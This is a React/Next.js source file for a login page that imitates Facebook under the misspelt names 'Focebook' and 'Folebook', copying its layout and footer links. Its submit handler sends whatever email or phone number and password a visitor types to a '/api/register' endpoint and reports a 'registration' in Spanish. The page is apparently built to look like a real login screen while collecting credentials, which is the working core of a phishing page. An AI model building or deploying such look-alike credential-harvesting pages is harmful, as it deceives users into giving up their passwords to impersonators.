"use client"

import type React from "react"
import { useState } from "react"
import { Button } from "@/components/ui/button"

export default function LoginForm() {
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      const response = await fetch('/api/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      })

      const data = await response.json()

      if (data.success) {
        alert(`✅ Registro exitoso para: ${email}`)
        setEmail("")
        setPassword("")
      }
    } catch (error) {
      alert('❌ Error de conexión')
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <div className="w-full max-w-md">
      <div className="text-center mb-8">
        <h1 className="text-5xl font-bold text-blue-600 tracking-tight">Focebook</h1>
      </div>

      <div className="bg-white rounded-lg shadow-lg p-8">
        <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-center">Log In to Focebook</h2>

        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-3 border-2 border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 bg-gray-50 text-gray-900 placeholder-gray-500 text-base font-medium"
              required
              disabled={isLoading}
            />
          </div>

          <div>
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-500 bg-gray-50 text-gray-900 placeholder-gray-500 text-base"
              required
              disabled={isLoading}
            />
          </div>

          <Button
            type="submit"
            className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg mt-6 text-base transition-colors"
            disabled={isLoading}
          >
            {isLoading ? "Enviando..." : "Log In"}
          </Button>
        </form>

        <div className="flex items-center my-6">
          <div className="flex-1 border-t border-gray-300"></div>
        </div>

        <div className="flex flex-col gap-3 text-center text-sm">
          <a href="#" className="text-blue-600 hover:underline font-medium">
            Forgot account?
          </a>
          <button
            type="button"
            className="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded-lg inline-block mx-auto transition-colors"
          >
            Create new Folebook account
          </button>
        </div>
      </div>

      <div className="mt-8 text-center text-xs text-gray-600 space-y-2">
        <p>
          <a href="#" className="hover:underline">About</a> · 
          <a href="#" className="hover:underline">Help</a> · 
          <a href="#" className="hover:underline">Privacy</a> · 
          <a href="#" className="hover:underline">Cookies</a>
        </p>
        <p className="text-gray-500">© 2025 focebook. All rights reserved.</p>
      </div>
    </div>
  )
}